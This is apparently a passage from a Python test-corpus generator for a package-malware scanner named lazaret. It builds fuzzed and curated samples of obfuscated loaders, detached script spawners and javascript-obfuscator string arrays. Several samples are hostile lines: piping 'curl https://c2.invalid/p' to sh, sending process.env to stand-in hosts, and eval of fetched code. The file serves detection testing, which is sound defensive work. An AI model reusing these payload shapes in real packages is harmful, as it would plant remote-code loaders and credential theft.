    # a child process's environment is the program's: a bundle's helper given it holds no data
    "var __spreadValues = (a, b) => { for (var prop in b) a[prop] = b[prop]; return a; };\n"
    "spawn('npm', ['i'], { cwd, env: __spreadValues({}, process.env) });\n"
    "fetch(url, __spreadValues({ method: 'POST' }, options));\n",
    "import os, subprocess, requests\nsubprocess.run(['x'], env=dict(os.environ))\nrequests.post(u, data=b)\n",
]
CHARCODE_CURATED = [
    # @fnos/app's shape: a runner's path kept as codes, decoded by the file's own function and started with node
    "var _d = [" + _cc_fnos("telemetry", 7) + "];\nvar _f = [" + _cc_fnos("runner.js", 3) + "];\n" + CC_FNOS
    + "spawn(process.execPath, [path.join(__dirname, decodeBuffer(_d, 7), decodeBuffer(_f, 3))], {detached: true});\n",
    CC_MAP + "const cp = require(" + CC_CALLS[2] + ");\ncp.execSync('curl https://c2.invalid/p | sh');\n",
    CC_SPLIT + "const o = require(r('pt'));\nrequire('https').get('https://abc.oastify.com/?h=' + o[r('iptuobnf')]());\n",
    CC_SPREAD + "fetch(" + CC_CALLS[5] + ").then((x) => x.text()).then(eval);\n",
    CC_PY_RANGE + "import os\nm = __import__(" + CC_CALLS[6] + ")\n",
    CC_PY_ENUM + "sp = __import__(" + CC_CALLS[7] + ")\nsp.run(['curl', 'https://c2.invalid/p'])\n",
    CC_PY_ITER + "exec(" + CC_CALLS[8] + ")\n",
    "const s = String.fromCharCode(104,116,116,112,115,58,47,47,99,50,46,105,110,118,97,108,105,100);\n"
    "require('https').get(s + '/?e=' + JSON.stringify(process.env));\n",
    "exec(''.join(map(chr, [105,109,112,111,114,116,32,111,115])))\n",
    "__import__(bytes([111,115]).decode()).system('id')\n",
    # not read: a changed array, codes out of range, a transform past 32 bits, a name for an argument
    "var _w = [" + _cc_fnos("runner.js", 7) + "];\n_w.push(1);\n" + CC_FNOS + "fork(decodeBuffer(_w, 7));\n",
    "String.fromCharCode(1114112)\nString.fromCharCode(0x110000)\nString.fromCharCode(10, 13)\n",
    "function d(a, k) { var s = ''; for (var i = 0; i < a.length; i++) s += String.fromCharCode(a[i] << 40); return s; }\n"
    "d([1, 2], 3)\n",
    CC_FNOS + "decodeBuffer(x, 7)\ndecodeBuffer([1, 2], k)\n",
]
# scripts a script starts with node or python (0.1.8): the calls, flags,
# path forms and names assigned them, and the pieces around them
SPAWN = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "\\", "/", "..", ".", "-",
         "spawn(process.execPath, [", "spawnSync('node', [", "execFile(\"nodejs.exe\", [", "execFileSync(process.argv[0], [",
         "fork(", "subprocess.Popen([sys.executable, ", "subprocess.run(['python3', ", "check_output([\"python\", ",
         "spawn(cmd, [", "run([x, ", "'lib/x.js'", "\"./a/b.js\"", "`w.js`", "'-e'", "'-m'", "'-r'", "'--require=./p.js'",
         "'--no-warnings'", "'-c'", "'-X'", "'dev'", "path.join(__dirname, 'x.js')", "path.resolve(__dirname, './lib', 'c.js')",
         "path.join(here, 'y.js')", "os.path.join(os.path.dirname(__file__), 'start.py')",
         "os.path.join(os.path.dirname(os.path.abspath(__file__)), '_rt', 's.py')", "Path(__file__).parent",
         "__dirname + '/w.js'", "__dirname+\"/q.js\"", "`${__dirname}/t.js`", "`${ __dirname }/u.js`",
         "const script = ", "let here = ", "_d = ", "script", "here", "_d", "f", "const f = path.join(__dirname, 'z.js');",
         "path.join(", "__dirname", "'..'", "'a\\b.js'", "'/abs.js'", "'x'.repeat(3)", "\u00e9", "\U0001F600",
         "], { detached: true })", "])", ")", "x" * 40,
         "execFileSync(bp, [", "spawn('bun', [", "spawn(\"deno\", [", "'run'", "subprocess.run([bun_exec, ",
         "path.dirname(fileURLToPath(import.meta.url))", "dirname(fileURLToPath(import.meta.url))",
         "import.meta.dirname", "Path(__file__).parent.resolve()", "SCRIPT_DIR / ENTRY", "SCRIPT_DIR / 'r.js'",
         "str(entry)", "const D = ", "const E = 'r.js';", "D", "E", "path.join(D, E)", "'x.ts'", "'README.md'",
         " / "]
SPAWN_CURATED = [
    "const { spawn } = require('child_process');\nconst path = require('path');\n"
    "const filePath = path.join(__dirname, 'smtp-connection/index.js');\n"
    "const child = spawn(process.execPath, [filePath], {\n  detached: true,\n  stdio: ['ignore', 'ignore', 'ignore']\n});\n"
    "child.unref();\n",
    "function runJobA(args) {\n  const script = path.resolve(__dirname, \"./lib/caller.js\");\n"
    "  const child = spawn(\"node\", [script, JSON.stringify(args)], {\n    detached: true,\n    stdio: \"ignore\"\n  });\n}\n",
    "_runtime_dir = os.path.join(os.path.dirname(__file__), \"_runtime\")\n_start = os.path.join(_runtime_dir, \"start.py\")\n"
    "if os.path.exists(_start):\n    subprocess.Popen(\n        [sys.executable, _start],\n        cwd=_runtime_dir,\n    )\n",
    "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\nspawn('node', ['-e', code])\n",
    "spawn(process.execPath, ['-r', './preload.js', '--no-warnings', 'lib/main.js'])\n",
    "const a = b, c = path.join(__dirname, 'a.js');\nfork(c);\n",
    # a runtime the script fetched, started on a file of the package (the 2026 setup.mjs loaders)
    "const D = path.dirname(fileURLToPath(import.meta.url));\nconst E = \"router_init.js\";\n"
    "const ep = path.join(D, E);\nexecFileSync(bp, [ep], { stdio: \"inherit\", cwd: D });\n",
    "SCRIPT_DIR = Path(__file__).parent.resolve()\nENTRY_SCRIPT = \"router_runtime.js\"\n"
    "entry_path = SCRIPT_DIR / ENTRY_SCRIPT\nresult = subprocess.run([bun_exec, str(entry_path)], cwd=SCRIPT_DIR)\n",
    "spawn('bun', ['run', path.join(__dirname, 'x.ts')]);\nspawn(\"deno\", [\"run\", \"-A\", \"y.ts\"]);\n",
    "execFile(esbuild, ['--version']);\nspawn(git, ['add', 'x.js']);\nspawn(editor, [path.join(__dirname, 'README.md')]);\n",
    "const d = import.meta.dirname;\nspawn(bin, [path.join(d, 'w.mjs')]);\n",
]
SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
           "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
           "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
           ".exe", "x"]


# ---- string arrays and proxy objects (0.1.8): obfuscated files built here, as
# javascript-obfuscator writes them (the array function, the accessor with
# its offset and decoding, the rotation loop and its checksum, aliases,
# wrappers, objects of constants and of proxies), with random names,
# strings, offsets, rotations and checksums; and their corruptions ----
_SA_B64 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/="


def _sa_btoa(text, alphabet=_SA_B64, pad=False):
    """javascript-obfuscator's btoa: UTF-8, then base64 over its alphabet."""
    data = text.encode("utf-8", "surrogatepass")
    out = []
    for i in range(0, len(data), 3):
        chunk = data[i:i + 3]
        n = int.from_bytes(chunk + b"\0" * (3 - len(chunk)), "big")
        digits = [(n >> s) & 63 for s in (18, 12, 6, 0)][:len(chunk) + 1]
        out.extend(alphabet[d] for d in digits)
        if pad:
            out.append("=" * (3 - len(chunk)))
    return "".join(out)


def _sa_rc4(text, key):
    box, j = list(range(256)), 0
    for i in range(256):
        j = (j + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[j] = box[j], box[i]
    i = j = 0
    out = []
    for ch in text:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        out.append(chr(ord(ch) ^ box[(box[i] + box[j]) % 256]))
    return "".join(out)


def _sa_lit(s, rnd):
    """A JavaScript single-quoted literal of s, escapes chosen at random."""
    out = []
    for ch in s:
        o = ord(ch)
        if ch in "'\\":
            out.append("\\" + ch)
        elif ch == "\n":
            out.append(rnd.choice(["\\n", "\\x0a", "\\u000a"]))
        elif o < 0x20 or o == 0x7f:
            out.append("\\x%02x" % o)
        elif o > 0xffff:
            out.append("\\u{%x}" % o)
        elif o > 0x7e and rnd.random() < 0.5:
            out.append("\\u%04x" % o)
        elif ch == " " and rnd.random() < 0.3:
            out.append("\\x20")
        else:
            out.append(ch)
    return "'" + "".join(out) + "'"


def _sa_name(rnd, used):
    while True:
        name = rnd.choice(["_0x", "a0_0x", "_$", "q"]) + "".join(rnd.choice("0123456789abcdef") for _ in range(rnd.randint(3, 6)))
        if name not in used:
            used.add(name)
            return name


def _sa_num(n, rnd):
    """n written as the obfuscator writes numbers: hex, decimal or an arithmetic of them."""
    k = rnd.random()
    if k < 0.4:
        return hex(n) if n >= 0 else "-" + hex(-n)
    if k < 0.6:
        return str(n)
    a = rnd.randint(1, 0x3ff)
    b = rnd.randint(1, 9)
    c = n - a * b
    return "(" + hex(a) + "*" + hex(b) + ("+" if c >= 0 else "-") + hex(abs(c)) + ")"


_SA_WORDS = ["child_process", "exec", "https", "request", "hostname", "env", "toString", "readFileSync", "http://x.invalid/c",
             "push", "shift", "length", "fromCharCode", "log", "Error sending log:", "café", "日本", "\U0001F600",
             "line\nbreak", "quote'd", "back\\slash", "", " ", "0x1f", "12abc", "-7", "require", "os", "platform"]


def strarr_case(rnd):
    """One obfuscated file: kind, rotation, wrappers, constants and proxies at random."""
    used = set()
    fn, arr, acc, alias = (_sa_name(rnd, used) for _ in range(4))
    kind = rnd.choice(["plain", "plain", "base64", "rc4"])
    strings = [rnd.choice(_SA_WORDS) + (str(rnd.randint(0, 99)) if rnd.random() < 0.3 else "") for _ in range(rnd.randint(4, 24))]
    terms = rnd.randint(2, 5)
    for _ in range(terms):                              # the checksum's strings: a number, then letters
        strings.append(str(rnd.randint(1, 999999)) + "".join(rnd.choice("abcdefXYZ") for _ in range(rnd.randint(0, 5))))
    rnd.shuffle(strings)
    n = len(strings)
    off = rnd.randint(0, 0x3ff)
    keys = ["".join(rnd.choice("abcdefgh#@()!$%") for _ in range(4)) for _ in range(3)]
    stored, key_of = [], {}
    for i, s in enumerate(strings):
        if kind == "plain":
            stored.append(s)
        elif kind == "base64":
            stored.append(_sa_btoa(s, pad=rnd.random() < 0.1))
        else:
            key = rnd.choice(keys)
            key_of[i] = key
            stored.append(_sa_btoa(_sa_rc4(s, key)))
    rot = rnd.randint(0, n - 1)
    file_items = stored[-rot:] + stored[:-rot] if rot else list(stored)   # (rotated left `rot` times at run time)
    src = []
    src.append("function " + fn + "(){const " + arr + "=[" + ",".join(_sa_lit(s, rnd) for s in file_items) + "];"
               + fn + "=function(){return " + arr + ";};return " + fn + "();}")
    p1, p2, q1, q2, cache = (_sa_name(rnd, used) for _ in range(5))
    body = ""
    if kind != "plain":
        body = "if(" + acc + "['x']===undefined){var d=function(s){const a='" + _SA_B64 + "';return s;};" + acc + "['x']=!![];}"
    if rnd.random() < 0.5:
        src.append("function " + acc + "(" + p1 + "," + p2 + "){" + p1 + "=" + p1 + "-" + _sa_num(off, rnd) + ";const "
                   + cache + "=" + fn + "();let v=" + cache + "[" + p1 + "];" + body + "return v;}")
    else:
        src.append("function " + acc + "(" + p1 + "," + p2 + "){const " + cache + "=" + fn + "();return " + acc + "=function("
                   + q1 + "," + q2 + "){" + q1 + "=" + q1 + "-" + _sa_num(off, rnd) + ";let v=" + cache + "[" + q1 + "];"
                   + body + "return v;}," + acc + "(" + p1 + "," + p2 + ");}")
    src.append("const " + alias + "=" + acc + ";")
    wrapper, shift = None, 0
    if rnd.random() < 0.5:                              # a wrapper that shifts the index
        wrapper = _sa_name(rnd, used)
        shift = rnd.randint(-0x80, 0x80)
        a, b, c = (_sa_name(rnd, used) for _ in range(3))
        wshift = ("- -" + hex(shift)) if shift >= 0 else ("-" + hex(-shift))
        if rnd.random() < 0.5:
            wshift = ("- -'" + hex(shift) + "'") if shift >= 0 else ("-'" + hex(-shift) + "'")
        src.append("function " + wrapper + "(" + a + "," + b + "," + c + "){return " + alias + "(" + c + wshift + "," + a + ");}")

    def call(i, name=None):
        """A call that reads strings[i] (index as the obfuscator writes it)."""
        idx = i + off
        key = key_of.get(i)
        keylit = "," + _sa_lit(key, rnd) if key is not None else ""
        if wrapper is not None and (name is None and rnd.random() < 0.6):
            k = idx - shift
            return wrapper + "(" + (_sa_lit(key, rnd) if key is not None else "0x0") + "," + hex(rnd.randint(0, 99)) + "," + _sa_num(k, rnd) + ")"
        return (name or rnd.choice([acc, alias])) + "(" + _sa_num(idx, rnd) + keylit + ")"

    # the checksum loop: its terms read the numbered strings
    numbered = [i for i, s in enumerate(strings) if s[:1].isdigit()]
    chosen = numbered[:terms]
    expr, value = "", 0.0
    from lazaret.scanner import core as _core
    for k, i in enumerate(chosen):
        div = rnd.randint(1, 12)
        sign = rnd.choice(["", "-"])
        term = sign + "parseInt(" + call(i) + ")/" + hex(div)
        v = (-1 if sign else 1) * _core._sa_parse_int(strings[i]) / div
        if k and rnd.random() < 0.4:
            mul = rnd.randint(1, 9)
            term = "(" + term + ")*" + hex(mul)
            v = v * mul
        expr = term if not expr else expr + "+" + term
        value = v if k == 0 else value + v
    target = value
    target_src = repr(target) if target != int(target) else _sa_num(int(target), rnd)
    g, a2 = _sa_name(rnd, used), _sa_name(rnd, used)
    src.append("(function(" + a2 + ",t){const " + g + "=" + acc + "," + arr + "2=" + a2 + "();while(!![]){try{const v=" + expr
               + ";if(v===t)break;else " + arr + "2['push'](" + arr + "2['shift']());}catch(e){" + arr + "2['push']("
               + arr + "2['shift']());}}}(" + fn + "," + target_src + "));")
    # uses: direct, through an object of constants, and through a proxy object
    consts = _sa_name(rnd, used)
    picks = [rnd.randrange(n) for _ in range(rnd.randint(2, 6))]
    ckeys = ["_0x" + "".join(rnd.choice("0123456789abcdef") for _ in range(5)) for _ in picks]
    src.append("const " + consts + "={" + ",".join(ck + ":" + hex(i + off) for ck, i in zip(ckeys, picks)) + "};")
    for ck, i in zip(ckeys, picks):
        key = key_of.get(i)
        src.append("x[" + alias + "(" + consts + "." + ck + ("," + _sa_lit(key, rnd) if key is not None else "") + ")];")
    for i in rnd.sample(range(n), min(n, 6)):
        src.append("y(" + call(i) + ");")
    if rnd.random() < 0.6:
        px, pc, pb, ps = _sa_name(rnd, used), "kCall", "kOp", "kStr"
        src.append("const " + px + "={'" + pc + "':function(f,a,b){return f(a,b);},'" + pb + "':function(a,b){return a"
                   + rnd.choice(["===", "+", "<", " in ", "&&"]) + "b;},'" + ps + "':'child_proc'+'ess'};")
        src.append(px + "['" + pc + "'](require," + px + "['" + ps + "'],\n" + call(0) + ");if(" + px + "['" + pb
                   + "'](1," + px + "['" + pc + "'](g,1,2))){}")
    text = "\n".join(src) if rnd.random() < 0.5 else "".join(src)
    r = rnd.random()
    if r < 0.15:                                        # corruptions: cut, a character changed, doubled
        text = text[:rnd.randint(0, len(text))]
    elif r < 0.3:
        i = rnd.randrange(len(text))
        text = text[:i] + rnd.choice("'\"(){}[];,=+-0x\\ ") + text[i + 1:]
    elif r < 0.35:
        text = text + "\n" + text
    return text


STRARR_CURATED = [
    # a plain array, the accessor that replaces itself, a checksum loop, an alias
    "function _0x3005(){const _0x1a7e=['error','1639918bmtUOu','env','http://x.invalid/c','8MAyWuw',"
    "'670455OteXAv'];_0x3005=function(){return _0x1a7e;};return _0x3005();}"
    "function _0x2c79(a,b){const c=_0x3005();return _0x2c79=function(d,e){d=d-0x1d1;let f=c[d];return f;},_0x2c79(a,b);}"
    "const _0x33e1=_0x2c79;(function(a,b){const g=_0x2c79,h=a();while(!![]){try{const i=parseInt(g(0x1d2))/0x1;"
    "if(i===b)break;else h['push'](h['shift']());}catch(j){h['push'](h['shift']());}}}(_0x3005,0x1905ee));"
    "fetch(_0x33e1(0x1d4),{'method':'POST','body':process[_0x33e1(0x1d3)]});",
]

# (0.1.8) programs written in string literals: the network call a literal's
# text names is the literal's own code (core._dl_in_code), a template
# literal's or an f-string's interpolation is the code around it
RECEIVED_CURATED = [
    'var execString = "var http = require(\'http\'), https = require(\'https\'), fs = require(\'fs\');"\n'
    '  + "var req = doRequest(options, function(response) {"\n'
    '  + "response.on(\'data\', function(chunk) { responseText += chunk; });"\n  + "});";\n'
    'var syncProc = spawn(process.argv[0], ["-e", execString]);\n',
    "import subprocess, sys\ncode = \"import urllib.request as u; print(u.urlopen('https://files.invalid/p').read())\"\n"
    "subprocess.run([sys.executable, '-c', code])\n",
    "import subprocess, sys\ncode = \"import urllib.request as u; exec(u.urlopen('https://files.invalid/p').read())\"\n"
    "subprocess.run([sys.executable, '-c', code])\n",
    "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', r => r.pipe(process.stdout))\\\"\");\n",
    "execSync(`node -e \"require('https').get('${u}', r => r.pipe(process.stdout))\"`);\n",
    "execSync(`node -e \"${(await (await fetch(u)).text())}\"`);\n",
    "import os\ncmd = f\"python -c \\\"import urllib.request as u; print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n",
    "import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n",
    "const s = \"require('https').get(u, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\n"
    "spawn(process.execPath, ['-e', s], { detached: true });\n",
    "const code = `${await (await fetch(u)).text()}`;\neval(code);\n",
    "const code = `fetch(u).then(r => r.text()).then(t => console.log(t))`;\nspawn(process.execPath, ['-e', code]);\n",
    "x = rb'urlopen(u)' + f'{urlopen(u).read()}'\nexec(x)\n",
]


def corpus(seed=20260926, scale=1):
    """CURATED, then random cases of 1 to `most` pieces of each alphabet.
    Each is the text both engines read from JSON (a package.json string):
    a lone surrogate stays one, but a high one next to a low one is the
    character they encode (a Python str could keep the two apart, a
    JavaScript string cannot)."""
    rnd = random.Random(seed)
    cases = (list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED + PERSIST_CURATED + PUBLISH_CURATED
             + DECODED_CURATED + SPAWN_CURATED + EXFIL_CURATED + SERVICE_CURATED + XOR_CURATED
             + CHARCODE_CURATED + FLOW_CURATED + STRARR_CURATED + RECEIVED_CURATED)
    for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
                                (SELF, 1500, 14), (SELF_ASYNC, 2000, 12), (PERSIST, 2500, 10), (PUBLISH, 3000, 12), (DECODED, 4000, 12), (SPAWN, 3000, 10),
                                (EXFIL, 2500, 10), (SERVICES, 2500, 10), (XOR, 1500, 10), (EXFIL_MORE, 2000, 10),
                                (CHARCODE, 1200, 10), (FLOW, 2000, 10)):
        for _ in range(count * scale):
            cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
    for _ in range(600 * scale):                    # obfuscated files: string arrays and proxy objects
        cases.append(strarr_case(rnd))
    for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
        head = rnd.choice(["", " ", "\t", "/usr/bin/", "/usr/bin/env ", "/usr/bin/env -S ", "env\t", "/bin/", "\n"])
        name = rnd.choice(["node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "PY",
                           "pypy", "sh", "bash", "zsh", "perl", "env", "\u212ash", "\u017fh", "x"])
        after = rnd.choice(["", " ", "\t", "\n", "\r\n", "\x1c", "\xa0", "/"])
        cases.append("#!" + head + name + after + "".join(rnd.choice(SHEBANG) for _ in range(rnd.randint(0, 6))))
    return [json.loads(json.dumps(text)) for text in cases]


def shard(cases):
    """The cases of this run: all of them, or with LAZARET_PARITY_SHARD=k/n
    (1 <= k <= n) every n-th one from the k-th, so that a machine that
    limits each run's time can read the corpus in n runs (CI reads it
    whole)."""
    spec = os.environ.get("LAZARET_PARITY_SHARD", "")
    if not spec:
        return cases
    k, n = (int(x) for x in spec.split("/"))
    if not 1 <= k <= n:
        raise ValueError(f"LAZARET_PARITY_SHARD={spec!r}: k/n with 1 <= k <= n")
    return cases[k - 1::n]


def sharded():
    """Is this run reading a shard of the corpus (see shard)?"""
    return bool(os.environ.get("LAZARET_PARITY_SHARD", ""))


def shlex_tokens(cmd):
    """_hook_tokens' shlex reading of cmd, or None where shlex raises (core's
    own, which keeps the last command's tokens for the calls after it)."""
    return core._hook_shlex(cmd)


def core_view(text):
    """core's answers for one case, in FIELDS order (as JSON would carry them)."""
    return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
            core.install_script_risk(text), list(core.import_time_risk(text)), core.node_candidates(text),
            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
            core.shebang_lang(text), list(core.import_time_risk(text, "py")), list(core.import_time_risk(text, "js")),
            core.self_publish_at(text), core.runs_dll(text), core.join_string_pieces(text), core.decoded_view(text),
            [list(t) for t in core.spawned_scripts(text)]]
